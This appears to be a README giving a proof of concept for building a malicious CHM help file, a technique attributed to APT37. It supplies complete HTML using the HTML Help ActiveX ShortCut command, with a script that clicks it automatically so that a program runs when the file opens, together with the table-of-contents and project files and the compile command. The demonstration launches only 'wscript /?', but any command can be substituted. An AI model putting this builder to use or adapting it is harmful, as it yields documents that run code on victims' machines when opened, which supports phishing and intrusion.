# Malicious CHM - Proof of Concept

Here are the steps to follow in order to create a malicious CHM file. As used by [APT37](https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37)

- Download the HTML Help Workshop (Htmlhelp.exe) from [MSDN](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-downloads). If the link is dead you can use the archive version [here](https://web.archive.org/web/20200614044818if_/http://download.microsoft.com/download/0/a/9/0a939ef6-e31c-430f-a3df-dfae7960d564/htmlhelp.exe)
- Once installed you should have a folder `C:\Program Files (x86)\HTML Help Workshop` and inside the `Microsoft HTML Help Compiler (hhc.exe)`
- We need to create 3 files:
  - Project File `.hpp`
  - HTML File `.htm`
  - Table of Contents File `.hhc`

### Malicious HTML

This document is using the CLSID [{ADB880A6-D8FF-11CF-9377-00AA003B7A11}](https://strontic.github.io/xcyclopedia/library/clsid_ADB880A6-D8FF-11CF-9377-00AA003B7A11.html) and the `Shortcut` command ([Read More](https://documentation.help/HTML-Help-ActiveX/ocx_shortcut.htm)).
It will execute the command `wscript` with the argument `/?`.

> **Note**
>
> The CLSID `{52A2AAAE-085D-4187-97EA-8C30DB990436}` can also be used instead. Read more [here](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/html-help-frequently-asked-questions#is-there-a-registry-key-that-enables-me-to-find-out-if-html-help-is-set-up-on-a-computer)

Filename: `poc-chm.htm`

```html
<HTML>
<HEAD>
	<META HTTP-EQUIV="Content-Type" CONTENT="text-html;charset=UTF-8">
</HEAD>
<BODY>
<h2>POC Malicious CHM</h2>
<OBJECT id=poc classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
    <PARAM name="Command" value="ShortCut">
    <PARAM name="Button" value="Bitmap::shortcut">
    <PARAM name="Item1" value=',wscript,/?'>
    <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
poc.Click();
</SCRIPT>

</BODY>
</HTML>
```

### CHM Table of Contents

The table of contentes references the HTML file created above. The path must be reachable from the current location of the table of content.
For example of the HTML file is located inside a folder then the path would be `path-to-folder\malicious `

Filename: `poc-chm.hhc`

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<!-- Sitemap 1.0 -->
</HEAD>
<BODY>
<UL>
	<LI> <OBJECT type="text/sitemap">
		<param name="Name" value="Setting up multiple users">
		<param name="Local" value="poc-chm.htm">
		</OBJECT>
</UL>
</BODY>
</HTML>

```

### Project File

The project file references both the "HTML" and the "Table of Contents"

Filename: `poc-chm.hpp`

```ini
[OPTIONS]
Contents file=poc-chm.hhc
[FILES]
poc-chm.htm
```

### Compilation

Once all files are created an placed in a single folder. Execute the following command to compile the CHM and profite.

`"C:\Program Files (x86)\HTML Help Workshop\hhc.exe" poc-chm.hpp`

![image](https://user-images.githubusercontent.com/8741929/231450607-e45210b6-7285-4238-8ca3-8c04d6d5bb2a.png)
